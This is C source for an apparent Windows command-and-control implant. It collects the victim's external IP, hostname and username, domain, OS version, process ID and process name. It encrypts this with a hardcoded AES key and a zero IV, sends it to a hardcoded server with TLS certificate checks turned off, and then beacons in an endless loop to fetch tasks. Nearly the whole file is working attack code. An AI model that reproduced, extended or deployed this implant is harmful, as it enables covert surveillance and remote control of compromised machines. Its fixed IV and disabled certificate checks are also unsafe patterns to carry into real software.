#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <process.h>
#include <iphlpapi.h>
#include <psapi.h>

#ifndef WINHTTP_FLAG_IGNORE_CERT_CN_INVALID
#define WINHTTP_FLAG_IGNORE_CERT_CN_INVALID 0x1000
#endif

#ifndef WINHTTP_FLAG_IGNORE_CERT_DATE_INVALID
#define WINHTTP_FLAG_IGNORE_CERT_DATE_INVALID 0x2000
#endif

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")

#define SERVER L"192.168.1.19"
#define PORT 443
#define AES_KEY_BASE64 "xalxACRIZkmDkMYu-BB0ec49-Qzj7aByCHaEtgm1jwI"
#define SESSION "adversary"
#define BUFFER_SIZE 4096

// Helper structs to hold task and system information
typedef struct
{
    char session[256];
    char ip[64];
    char username[256];
    char domain[256];
    char os_version[256];
    char imp_pid[16];
    char process_name[256];
    char sleep_time[16];
} ImpInfo;

typedef struct
{
    char session[256];
    char task_name[256];
    char output[BUFFER_SIZE];
} OutputData;

typedef struct
{
    char sleep_time[16];
} SleepTime;

// Function to Base64 decode the AES key
// Function to Base64 decode with URL-safe conversion and proper padding
BOOL Base64UrlDecode(const char *input, BYTE **output, DWORD *output_len)
{
    // Length of the input string
    DWORD len = strlen(input);
    int padding = (4 - (len % 4)) % 4; // Calculate the required padding

    // Allocate memory to hold the modified input with padding
    char *temp = (char *)malloc(len + padding + 1);
    if (!temp)
        return FALSE;

    // Copy the input into the temp buffer and replace '-' and '_' to make it standard base64
    strcpy_s(temp, len + padding + 1, input);
    for (DWORD i = 0; i < len; i++)
    {
        if (temp[i] == '-')
            temp[i] = '+';
        else if (temp[i] == '_')
            temp[i] = '/';
    }

    // Add padding '=' if necessary
    for (int i = 0; i < padding; i++)
    {
        temp[len + i] = '=';
    }
    temp[len + padding] = '\0';

    // First call to CryptStringToBinaryA to get the required output size
    if (!CryptStringToBinaryA(temp, 0, CRYPT_STRING_BASE64, NULL, output_len, NULL, NULL))
    {
        free(temp);
        return FALSE;
    }

    // Allocate memory for the output binary data
    *output = (BYTE *)malloc(*output_len);
    if (!*output)
    {
        free(temp);
        return FALSE;
    }

    // Second call to actually decode the base64 string into binary data
    if (!CryptStringToBinaryA(temp, 0, CRYPT_STRING_BASE64, *output, output_len, NULL, NULL))
    {
        free(temp);
        free(*output);
        *output = NULL;
        return FALSE;
    }

    // Free the temporary buffer
    free(temp);
    return TRUE;
}

// Function to apply PKCS#7 padding
// Function to apply PKCS#7 padding
void ApplyPadding(BYTE *input, DWORD input_len, DWORD block_size, DWORD *padded_len)
{
    DWORD pad_len = block_size - (input_len % block_size); // Calculate padding size
    *padded_len = input_len + pad_len;                     // New padded length
    for (DWORD i = input_len; i < *padded_len; i++)
    {
        input[i] = (BYTE)pad_len; // Add padding bytes
    }
}

// Function to perform AES-256-CBC encryption
BOOL AES256Encrypt(BYTE *key, BYTE *plaintext, DWORD plaintext_len, BYTE *iv, BYTE *ciphertext, DWORD *ciphertext_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    DWORD block_len = 16; // AES block size
    DWORD padded_len = 0;

    // Apply PKCS#7 padding
    BYTE padded_plaintext[BUFFER_SIZE] = {0}; // Adjust buffer size as necessary
    memcpy(padded_plaintext, plaintext, plaintext_len);
    ApplyPadding(padded_plaintext, plaintext_len, block_len, &padded_len);

    // Open an algorithm handle
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        printf("Error opening algorithm: 0x%x\n", status);
        return FALSE;
    }

    // Set chaining mode to CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status))
    {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        printf("Error setting chaining mode: 0x%x\n", status);
        return FALSE;
    }

    // Generate a key handle
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0); // AES-256 key is 32 bytes
    if (!BCRYPT_SUCCESS(status))
    {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        printf("Error generating symmetric key: 0x%x\n", status);
        return FALSE;
    }

    DWORD cbResult = 0;
    *ciphertext_len = BUFFER_SIZE; // Ensure ciphertext buffer is large enough
    status = BCryptEncrypt(hKey, padded_plaintext, padded_len, NULL, iv, block_len, ciphertext, *ciphertext_len, &cbResult, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        printf("Error encrypting data: 0x%x\n", status);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    *ciphertext_len = cbResult;

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return TRUE;
}

// Function to Base64 encode the encrypted data
BOOL Base64UrlEncode(const BYTE *input, DWORD input_length, char *output, DWORD output_size)
{
    DWORD encoded_length = 0;

    // Base64 encode the input
    if (!CryptBinaryToStringA(input, input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encoded_length))
    {
        return FALSE;
    }

    if (encoded_length > output_size)
    {
        return FALSE;
    }

    if (!CryptBinaryToStringA(input, input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, output, &encoded_length))
    {
        return FALSE;
    }

    // Replace Base64 characters for URL-safe Base64
    for (DWORD i = 0; i < encoded_length; i++)
    {
        if (output[i] == '+')
        {
            output[i] = '-';
        }
        else if (output[i] == '/')
        {
            output[i] = '_';
        }
    }

    // Remove padding '=' characters (Python's `rstrip('=')`)
    while (encoded_length > 0 && output[encoded_length - 1] == '=')
    {
        output[--encoded_length] = '\0';
    }

    return TRUE;
}

// Function to get external IP using WinHTTP (api.ipify.org)
BOOL GetExternalIP(char *ip, DWORD ip_size)
{
    HINTERNET hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        return FALSE;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD dwSize = 0;
    WinHttpQueryDataAvailable(hRequest, &dwSize);
    if (dwSize > 0)
    {
        LPSTR pszOutBuffer = (LPSTR)malloc(dwSize + 1);
        if (pszOutBuffer)
        {
            ZeroMemory(pszOutBuffer, dwSize + 1);
            DWORD dwDownloaded = 0;
            WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
            strncpy_s(ip, ip_size, pszOutBuffer, _TRUNCATE);
            free(pszOutBuffer);
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}

// Function to get username in "hostname\\username" format
BOOL GetUsername(char *username, DWORD size)
{
    char hostname[256];
    DWORD hostname_len = 256;
    DWORD len = size;

    if (!GetUserNameA(username, &len))
        return FALSE;
    if (!GetComputerNameA(hostname, &hostname_len))
        return FALSE;

    snprintf(username, size, "%s\\%s", hostname, username);
    return TRUE;
}

// Function to get domain from environment variable
BOOL GetDomain(char *domain, DWORD size)
{
    char *userdomain = getenv("USERDOMAIN");
    if (userdomain)
    {
        strncpy_s(domain, size, userdomain, _TRUNCATE);
    }
    else
    {
        strncpy_s(domain, size, "Unknown", _TRUNCATE);
    }
    return TRUE;
}

// Function to get OS version
BOOL GetOSVersion(char *os_version, DWORD size)
{
    OSVERSIONINFOEXA osvi = {sizeof(OSVERSIONINFOEXA)};
    if (!GetVersionExA((OSVERSIONINFOA *)&osvi))
        return FALSE;
    snprintf(os_version, size, "Windows-%ld-%ld.%ld.%ld-SP%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwPlatformId, osvi.wServicePackMajor);
    return TRUE;
}

// Function to get PID
BOOL GetPID(char *pid_str, DWORD size)
{
    DWORD pid = GetCurrentProcessId();
    snprintf(pid_str, size, "%lu", pid);
    return TRUE;
}

// Function to get process name
BOOL GetProcessName(char *process_name, DWORD size)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
    if (hProcess == NULL)
        return FALSE;

    HMODULE hMod;
    DWORD cbNeeded;
    if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
    {
        GetModuleBaseNameA(hProcess, hMod, process_name, size);
    }
    CloseHandle(hProcess);
    return TRUE;
}

void escape_json_string(const char *input, char *output, size_t output_size)
{
    const char *src = input;
    char *dest = output;
    size_t remaining = output_size - 1; // Reserve space for null-terminator

    while (*src && remaining > 0)
    {
        if (*src == '\\' || *src == '"')
        {
            if (remaining < 2)
                break;      // Need 2 characters for escape sequence
            *dest++ = '\\'; // Add escape character
            remaining--;
        }
        *dest++ = *src++;
        remaining--;
    }
    *dest = '\0'; // Null-terminate the string
}

// Function to send HTTP POST request with encrypted and base64-encoded data
BOOL SendPOST(const wchar_t *server, int port, const wchar_t *path, const char *data, const char *session, char *response, DWORD response_size) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL result = FALSE;
    DWORD dwError = 0;
    DWORD dwSize = 0, dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;

    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        dwError = GetLastError();
        return FALSE;
    }

    hConnect = WinHttpConnect(hSession, server, port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD dwOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOptions, sizeof(dwOptions));

    wchar_t headers[512];
    swprintf(headers, sizeof(headers) / sizeof(wchar_t), L"X-Unique-Identifier: %hs\r\nContent-Type: text/plain", session);

    if (!WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)data, (DWORD)strlen(data), (DWORD)strlen(data), 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    do {
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;

        pszOutBuffer = (LPSTR)malloc(dwSize + 1);
        if (!pszOutBuffer) break;

        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) break;

        if (dwDownloaded > 0 && (strlen(response) + dwDownloaded < response_size)) {
            strncat_s(response, response_size, pszOutBuffer, dwDownloaded);
        }

        free(pszOutBuffer);
    } while (dwSize > 0);

    result = TRUE;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

// Main function
int main() {
    ImpInfo info;
    char token[256] = {0};
    BYTE iv[16] = {0};
    BYTE *aes_key = NULL;
    DWORD aes_key_len = 0;

    if (!Base64UrlDecode(AES_KEY_BASE64, &aes_key, &aes_key_len) || aes_key_len != 32) {
        printf("Failed to decode AES key.\n");
        return 1;
    }

    // Gather system information
    strncpy_s(info.session, sizeof(info.session), SESSION, _TRUNCATE);
    GetExternalIP(info.ip, sizeof(info.ip));
    GetUsername(info.username, sizeof(info.username));
    GetDomain(info.domain, sizeof(info.domain));
    GetOSVersion(info.os_version, sizeof(info.os_version));
    GetPID(info.imp_pid, sizeof(info.imp_pid));
    GetProcessName(info.process_name, sizeof(info.process_name));
    snprintf(info.sleep_time, sizeof(info.sleep_time), "%d", 2);

    printf("Initialized ImpInfo: {\"session\": \"%s\", \"ip\": \"%s\", \"username\": \"%s\", \"domain\": \"%s\", \"os\": \"%s\", \"imp_pid\": \"%s\", \"process_name\": \"%s\", \"sleep\": \"%s\"}\n",
           info.session, info.ip, info.username, info.domain, info.os_version, info.imp_pid, info.process_name, info.sleep_time);

    // First check-in to retrieve the session token
    char response[BUFFER_SIZE] = {0};
    char request_body[BUFFER_SIZE] = {0};
    BYTE encrypted_data[BUFFER_SIZE] = {0};
    DWORD encrypted_data_len = sizeof(encrypted_data);

        char escaped_username[512] = {0};
        escape_json_string(info.username, escaped_username, sizeof(escaped_username));

        snprintf(request_body, BUFFER_SIZE, "{\"session\":\"%s\", \"ip\":\"%s\", \"username\":\"%s\", \"domain\":\"%s\", \"os\":\"%s\", \"imp_pid\":\"%s\", \"process_name\":\"%s\", \"sleep\":\"%s\"}",
                 info.session, info.ip, escaped_username, info.domain, info.os_version, info.imp_pid, info.process_name, info.sleep_time);

    if (!AES256Encrypt(aes_key, (BYTE *)request_body, strlen(request_body), iv, encrypted_data, &encrypted_data_len)) {
        printf("Failed to encrypt data.\n");
        free(aes_key);
        return 1;
    }

    char base64_encoded_data[BUFFER_SIZE] = {0};
    if (!Base64UrlEncode(encrypted_data, encrypted_data_len, base64_encoded_data, sizeof(base64_encoded_data))) {
        printf("Failed to Base64 encode data.\n");
        free(aes_key);
        return 1;
    }

    if (!SendPOST(SERVER, PORT, L"/js", base64_encoded_data, info.session, response, sizeof(response))) {
        printf("Failed to send check-in.\n");
        Sleep(2000);
        return 1;
    }

    printf("Received session token: %s\n", response);
    strncpy_s(token, sizeof(token), response, _TRUNCATE);

    // Use session token for task requests
    while (1) {
        char task_response[BUFFER_SIZE] = {0};
        char sleep_payload[256] = "{\"sleep\":\"2\"}";

        if (!AES256Encrypt(aes_key, (BYTE *)sleep_payload, strlen(sleep_payload), iv, encrypted_data, &encrypted_data_len)) {
            printf("Failed to encrypt sleep payload.\n");
            break;
        }

        if (!Base64UrlEncode(encrypted_data, encrypted_data_len, base64_encoded_data, sizeof(base64_encoded_data))) {
            printf("Failed to Base64 encode sleep payload.\n");
            break;
        }

        if (!SendPOST(SERVER, PORT, L"/index", base64_encoded_data, token, task_response, sizeof(task_response))) {
            printf("Failed to retrieve tasks.\n");
            Sleep(2000);
            continue;
        }

        printf("Received tasks: %s\n", task_response);

        Sleep(2000);
    }

    free(aes_key);
    return 0;
}